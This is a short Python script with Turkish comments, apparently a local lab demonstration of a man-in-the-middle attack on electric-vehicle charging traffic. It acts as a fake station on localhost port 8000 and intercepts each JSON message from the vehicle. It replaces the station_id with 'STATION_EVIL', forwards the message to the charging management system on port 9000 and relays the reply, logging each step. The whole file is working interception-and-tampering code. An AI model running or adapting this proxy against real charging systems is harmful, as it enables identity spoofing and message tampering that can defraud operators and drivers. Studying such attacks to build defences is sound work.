import socket
import json
import os
from datetime import datetime

os.makedirs("logs", exist_ok=True)

MITM_LOG = "logs/mitm_log.txt"

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8000   # EV buraya bağlanır

CSMS_HOST = "127.0.0.1"
CSMS_PORT = 9000     # CSMS buradadır

FAKE_STATION_ID = "STATION_EVIL"

def log(msg):
    with open(MITM_LOG, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

def start_mitm():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)

    print("🕵️ MITM (SAHTE İSTASYON) ÇALIŞIYOR...")
    log("MITM proxy başlatıldı")

    while True:
        ev_client, addr = server.accept()
        data = ev_client.recv(4096).decode()
        message = json.loads(data)

        original_station = message.get("station_id")
        message["station_id"] = FAKE_STATION_ID

        log(f"EV'den gelen mesaj: {message}")
        log(f"station_id değiştirildi: {original_station} → {FAKE_STATION_ID}")

        # CSMS'ye bağlan
        csms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        csms.connect((CSMS_HOST, CSMS_PORT))
        csms.send(json.dumps(message).encode())

        response = csms.recv(4096).decode()
        csms.close()

        log(f"CSMS yanıtı: {response}")

        ev_client.send(response.encode())
        ev_client.close()

if __name__ == "__main__":
    start_mitm()
